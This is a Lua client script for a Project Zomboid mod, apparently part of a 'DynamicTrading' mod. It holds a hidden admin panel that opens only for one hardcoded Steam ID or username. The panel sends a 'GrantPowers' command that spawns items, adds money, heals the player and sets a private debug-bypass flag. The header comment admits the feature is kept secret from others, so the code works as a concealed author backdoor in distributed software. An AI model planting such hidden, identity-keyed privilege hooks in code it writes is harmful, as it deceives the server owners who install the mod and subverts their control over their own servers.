-- =============================================================================
-- CLIENT SIDE: PSYCHOPATZ ADMIN PANEL
-- This is just for debugging purposes only to easily test other server.
-- I wont abuse this panel for any other nefarious purpose and will ask 
-- permission to the owner of the server before using it.
-- I'm keeping it to myself so that others will not complain about it again.
-- =============================================================================

-- !!! CONFIGURATION !!!
local MY_STEAM_ID = "76561198137190990"
local MY_SP_NAME  = "Psychopatz"
local KEY_TRIGGER = 82 

-- =============================================================================
-- 1. DEFINE THE UI CLASS
-- =============================================================================
PsychopatzDebugWindow = ISCollapsableWindow:derive("PsychopatzDebugWindow")

function PsychopatzDebugWindow:initialise()
    ISCollapsableWindow.initialise(self)
    self.title = "Psychopatz Admin Control"
    self:setResizable(false)
end

function PsychopatzDebugWindow:createChildren()
    ISCollapsableWindow.createChildren(self)
    
    local padX = 10
    local currentY = self:titleBarHeight() + 10
    local winWidth = 250
    local elementWidth = winWidth - (padX * 2)
    local lineHeight = 25 
    
    -- ==========================================
    -- 1. SEQUENTIAL CHECKBOXES
    -- ==========================================
    
    
    -- Option A: Heal
    self.chkHeal = ISTickBox:new(padX, currentY, elementWidth, 20, "", self, nil)
    self.chkHeal:initialise(); self.chkHeal:instantiate()
    self.chkHeal:addOption("Heal Wounds")
    self.chkHeal:setSelected(1, true)
    self.chkHeal:setFont(UIFont.Small)
    self:addChild(self.chkHeal)
    currentY = currentY + lineHeight

    -- Option B: Stats
    self.chkStats = ISTickBox:new(padX, currentY, elementWidth, 20, "", self, nil)
    self.chkStats:initialise(); self.chkStats:instantiate()
    self.chkStats:addOption("Reset Stats")
    self.chkStats:setSelected(1, true)
    self.chkStats:setFont(UIFont.Small)
    self:addChild(self.chkStats)
    currentY = currentY + lineHeight + 5 

    -- Option C: Spawn
    self.chkSpawn = ISTickBox:new(padX, currentY, elementWidth, 20, "", self, nil)
    self.chkSpawn:initialise(); self.chkSpawn:instantiate()
    self.chkSpawn:addOption("Spawn Item")
    self.chkSpawn:setSelected(1, false) 
    self.chkSpawn:setFont(UIFont.Small)
    self:addChild(self.chkSpawn)
    currentY = currentY + lineHeight

    -- ==========================================
    -- 1.5 QUICK SHORTCUTS
    -- ==========================================
    
    -- Option D: Money
    self.chkMoney = ISTickBox:new(padX, currentY, 150, 20, "", self, nil)
    self.chkMoney:initialise(); self.chkMoney:instantiate()
    self.chkMoney:addOption("Add Money")
    self.chkMoney:setSelected(1, false)
    self.chkMoney:setFont(UIFont.Small)
    self:addChild(self.chkMoney)
    
    self.qtyMoney = ISTextEntryBox:new("100", padX + 160, currentY, 50, 20)
    self.qtyMoney:initialise(); self.qtyMoney:instantiate()
    self.qtyMoney:setOnlyNumbers(true)
    self:addChild(self.qtyMoney)
    currentY = currentY + lineHeight

    -- Option E: Walkie
    self.chkWalkie = ISTickBox:new(padX, currentY, 150, 20, "", self, nil)
    self.chkWalkie:initialise(); self.chkWalkie:instantiate()
    self.chkWalkie:addOption("Add Walkie Talkie")
    self.chkWalkie:setSelected(1, false)
    self.chkWalkie:setFont(UIFont.Small)
    self:addChild(self.chkWalkie)
    
    self.qtyWalkie = ISTextEntryBox:new("1", padX + 160, currentY, 50, 20)
    self.qtyWalkie:initialise(); self.qtyWalkie:instantiate()
    self.qtyWalkie:setOnlyNumbers(true)
    self:addChild(self.qtyWalkie)
    currentY = currentY + lineHeight

    -- Option F: Night Vision
    self.chkNight = ISTickBox:new(padX, currentY, elementWidth, 20, "", self, nil)
    self.chkNight:initialise(); self.chkNight:instantiate()
    self.chkNight:addOption("Night Vision")
    self.chkNight:setSelected(1, _G.PsychopatzNightVisionActive or false)
    self.chkNight:setFont(UIFont.Small)
    self:addChild(self.chkNight)
    currentY = currentY + lineHeight

    -- ==========================================
    -- 2. LABELS ROW
    -- ==========================================
    local qtyWidth = 40
    local itemWidth = elementWidth - qtyWidth - 10 

    local lblItem = ISLabel:new(padX, currentY, 20, "Item ID", 1, 1, 1, 1, UIFont.Small, true)
    self:addChild(lblItem)

    local lblQty = ISLabel:new(padX + itemWidth + 10, currentY, 20, "Qty", 1, 1, 1, 1, UIFont.Small, true)
    self:addChild(lblQty)
    
    currentY = currentY + 18 

    -- ==========================================
    -- 3. INPUTS ROW (Item + Qty)
    -- ==========================================
    self.itemEntry = ISTextEntryBox:new("Base.Katana", padX, currentY, itemWidth, 20)
    self.itemEntry:initialise(); self.itemEntry:instantiate()
    self.itemEntry:setClearButton(true) 
    
    -- [[[ CUSTOM BEHAVIOR ]]]
    -- Override the default clear function to reset to "Base." instead of empty string
    function self.itemEntry:clear()
        self:setText("Base.")
    end

    self:addChild(self.itemEntry)

    self.qtyEntry = ISTextEntryBox:new("1", padX + itemWidth + 10, currentY, qtyWidth, 20)
    self.qtyEntry:initialise(); self.qtyEntry:instantiate()
    self.qtyEntry:setOnlyNumbers(true)
    self:addChild(self.qtyEntry)

    currentY = currentY + 30 

    -- ==========================================
    -- 4. EXECUTE BUTTON
    -- ==========================================
    self.executeBtn = ISButton:new(padX, currentY, elementWidth, 25, "EXECUTE", self, PsychopatzDebugWindow.onExecute)
    self.executeBtn:initialise(); self.executeBtn:instantiate()
    self.executeBtn.borderColor = {r=1, g=1, b=1, a=0.4}
    self:addChild(self.executeBtn)

    currentY = currentY + 30

    self.debugHubBtn = ISButton:new(padX, currentY, elementWidth, 25, "OPEN DEBUG HUB", self, PsychopatzDebugWindow.onOpenDebugHub)
    self.debugHubBtn:initialise(); self.debugHubBtn:instantiate()
    self.debugHubBtn.borderColor = {r=1, g=1, b=1, a=0.4}
    self.debugHubBtn.backgroundColor = {r=0.28, g=0.18, b=0.46, a=1}
    self:addChild(self.debugHubBtn)

    -- ==========================================
    -- 5. FINAL RESIZE
    -- ==========================================
    currentY = currentY + 35
    self:setHeight(currentY)
end

function PsychopatzDebugWindow:onExecute()
    local doSpawn  = self.chkSpawn:isSelected(1)
    local doHeal   = self.chkHeal:isSelected(1)
    local doStats  = self.chkStats:isSelected(1)
    local doMoney  = self.chkMoney:isSelected(1)
    local doWalkie = self.chkWalkie:isSelected(1)
    local doNight  = self.chkNight:isSelected(1)
    
    local itemID   = self.itemEntry:getText()
    local quantity = tonumber(self.qtyEntry:getText()) or 1
    
    local qtyMoney  = tonumber(self.qtyMoney:getText()) or 100
    local qtyWalkie = tonumber(self.qtyWalkie:getText()) or 1

    local player = getPlayer()
    if player then
        local args = {
            itemID    = itemID,
            quantity  = quantity,
            doSpawn   = doSpawn,
            doHeal    = doHeal,
            doStats   = doStats,
            doMoney   = doMoney,
            qtyMoney  = qtyMoney,
            doWalkie  = doWalkie,
            qtyWalkie = qtyWalkie
        }
        
        sendClientCommand(player, "DynamicTrading", "GrantPowers", args)
        
        -- Handle Night Vision Toggle Locally
        _G.PsychopatzNightVisionActive = doNight
        
        if HaloTextHelper then
             HaloTextHelper.addTextWithArrow(player, "COMMAND SENT", true, HaloTextHelper.getColorGreen())
        end
    end
    
    self:close()
end

function PsychopatzDebugWindow:onOpenDebugHub()
    _G.DT_PRIVATE_DEBUG_BYPASS = true
    local ok = pcall(require, "DT/Common/UI/Debug/DT_CentralDebugHubWindow")
    if ok and DT_CentralDebugHubWindow and DT_CentralDebugHubWindow.Open then
        DT_CentralDebugHubWindow.Open()
    else
        local player = getPlayer()
        if player then
            player:Say("Debug hub unavailable.")
        end
    end
end

-- =============================================================================
-- 2. HELPER & KEY LISTENER
-- =============================================================================

local function getSafeSteamID(player)
    local rawID = player:getSteamID()
    if not rawID or rawID == 0 or rawID == "0" then return "0" end
    if type(rawID) == "number" then return string.format("%.0f", rawID) end
    return tostring(rawID)
end

local function onPsychopatzKey(key)
    if key == KEY_TRIGGER then
        local player = getPlayer()
        if not player then return end

        local safeID   = getSafeSteamID(player)
        local username = player:getUsername()
        local isSP     = not isClient()

        local isAllowed = false
        if safeID == MY_STEAM_ID then
            isAllowed = true
        elseif isSP and username == MY_SP_NAME then
            isAllowed = true
        end

        if isAllowed then
            _G.DT_PRIVATE_DEBUG_BYPASS = true
            local w = 250
            local h = 100 -- Will be auto-resized
            local core = getCore()
            local x = (core:getScreenWidth() / 2) - (w / 2)
            local y = (core:getScreenHeight() / 2) - (h / 2)

            local ui = PsychopatzDebugWindow:new(x, y, w, h)
            ui:initialise()
            ui:addToUIManager()
            

            ui:setY((core:getScreenHeight() / 2) - (ui:getHeight() / 2))
            
            if ui.itemEntry then ui.itemEntry:selectAll() end
        else
            
        end
    end
end

Events.OnKeyPressed.Add(onPsychopatzKey)

-- =============================================================================
-- 3. NIGHT VISION EFFECT (LIGHT SOURCE)
-- =============================================================================

local NightVisionLight = nil
_G.PsychopatzNightVisionActive = _G.PsychopatzNightVisionActive or false

-- Throttled update to be more performant
local updateTick = 0

local function updateNightVision()
    local player = getPlayer()
    if not player then return end

    if _G.PsychopatzNightVisionActive then
        updateTick = updateTick + 1
        -- Re-add every 5 seconds or if it vanishes
        if not NightVisionLight or updateTick % 300 == 0 then
            if NightVisionLight then getCell():removeLamppost(NightVisionLight) end
            
            NightVisionLight = IsoLightSource.new(
                math.floor(player:getX()), 
                math.floor(player:getY()), 
                math.floor(player:getZ()), 
                1.0, 1.0, 1.0, 20
            )
            getCell():addLamppost(NightVisionLight)
        else
            -- Ensure it stays on player every frame for visual consistency
            NightVisionLight:setX(math.floor(player:getX()))
            NightVisionLight:setY(math.floor(player:getY()))
            NightVisionLight:setZ(math.floor(player:getZ()))
        end
    else
        if NightVisionLight then
            getCell():removeLamppost(NightVisionLight)
            NightVisionLight = nil
        end
    end
end

Events.OnTick.Add(updateNightVision)